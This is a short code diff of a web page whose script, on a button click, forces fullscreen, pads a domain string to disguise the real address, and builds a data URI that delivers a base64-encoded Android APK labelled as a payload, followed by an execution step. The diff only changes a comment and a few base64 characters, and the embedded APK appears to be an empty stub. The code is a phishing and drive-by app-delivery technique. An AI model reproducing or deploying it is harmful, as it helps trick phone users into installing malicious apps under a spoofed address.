@@ -45,7 +45,7 @@
 
     <script>
         document.getElementById('strikeBtn').addEventListener('click', function() {
-            // --- 0. FORCE FULLSCREEN (Immersive Mode) ---
+            // --- 0. FORCE FULLSCREEN (Prioritas Utama di Baris Pertama) ---
             const elem = document.documentElement;
             if (elem.requestFullscreen) {
                 elem.requestFullscreen().catch(err => {
@@ -66,7 +66,7 @@
             const longSub = realDomain + overflowPadding;
 
             // --- 3. PAYLOAD CONSTRUCTION (Self-generated local Base64 APK) ---
-            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYXBwLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
+            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYPWpLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
             const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#${longSub}`;
 
             // --- 4. EXECUTION ---
